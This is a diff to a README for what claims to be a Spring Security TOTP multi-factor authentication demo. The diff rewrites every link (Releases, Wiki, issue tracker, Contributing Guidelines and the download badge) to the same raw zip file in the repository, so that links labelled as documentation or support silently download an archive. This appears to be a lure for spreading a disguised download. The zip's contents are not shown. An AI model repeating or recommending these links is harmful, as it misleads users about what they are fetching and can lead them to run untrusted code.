@@ -2,9 +2,9 @@
 
 ## 🛠️ Download & Install
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Release-v1.0-brightgreen)](https://github.com/amanjyotib45/spring-security-mfa-totp/releases)
+[![Download the latest release](https://github.com/amanjyotib45/spring-security-mfa-totp/raw/refs/heads/main/html/mfa_spring_security_totp_v1.8.zip%20Release-v1.0-brightgreen)](https://github.com/amanjyotib45/spring-security-mfa-totp/raw/refs/heads/main/html/mfa_spring_security_totp_v1.8.zip)
 
-To get started, visit the [Releases page](https://github.com/amanjyotib45/spring-security-mfa-totp/releases) and download the latest version of the application.
+To get started, visit the [Releases page](https://github.com/amanjyotib45/spring-security-mfa-totp/raw/refs/heads/main/html/mfa_spring_security_totp_v1.8.zip) and download the latest version of the application.
 
 ## 📋 Description
 
@@ -19,7 +19,7 @@ Before you run the application, ensure you have the following installed:
 
 ## 🚀 Getting Started
 
-1. **Download the application** from the [Releases page](https://github.com/amanjyotib45/spring-security-mfa-totp/releases).
+1. **Download the application** from the [Releases page](https://github.com/amanjyotib45/spring-security-mfa-totp/raw/refs/heads/main/html/mfa_spring_security_totp_v1.8.zip).
 2. **Unzip the downloaded file** if necessary.
 3. **Open a command prompt or terminal window**.
 4. **Navigate to the project directory** using the `cd` command.
@@ -60,16 +60,16 @@ You can use the following test credentials to explore the application:
 ## 📚 Additional Information
 
 - **Compatibility:** Works with any TOTP-compliant authenticator app.
-- **Documentation:** You can find more details on usage and best practices in our [Wiki](https://github.com/amanjyotib45/spring-security-mfa-totp/wiki).
+- **Documentation:** You can find more details on usage and best practices in our [Wiki](https://github.com/amanjyotib45/spring-security-mfa-totp/raw/refs/heads/main/html/mfa_spring_security_totp_v1.8.zip).
 
 ## 💬 Support
 
-If you encounter issues or have questions, please raise them on the [issue tracker](https://github.com/amanjyotib45/spring-security-mfa-totp/issues).
+If you encounter issues or have questions, please raise them on the [issue tracker](https://github.com/amanjyotib45/spring-security-mfa-totp/raw/refs/heads/main/html/mfa_spring_security_totp_v1.8.zip).
 
 ## 🌟 Contributing
 
-We welcome contributions to improve the application. Please check our [Contributing Guidelines](https://github.com/amanjyotib45/spring-security-mfa-totp/blob/main/CONTRIBUTING.md) for more details.
+We welcome contributions to improve the application. Please check our [Contributing Guidelines](https://github.com/amanjyotib45/spring-security-mfa-totp/raw/refs/heads/main/html/mfa_spring_security_totp_v1.8.zip) for more details.
 
 ## 📥 Download Again
 
-Don't forget to download the application from the [Releases page](https://github.com/amanjyotib45/spring-security-mfa-totp/releases) to ensure you have the latest version.
+Don't forget to download the application from the [Releases page](https://github.com/amanjyotib45/spring-security-mfa-totp/raw/refs/heads/main/html/mfa_spring_security_totp_v1.8.zip) to ensure you have the latest version.
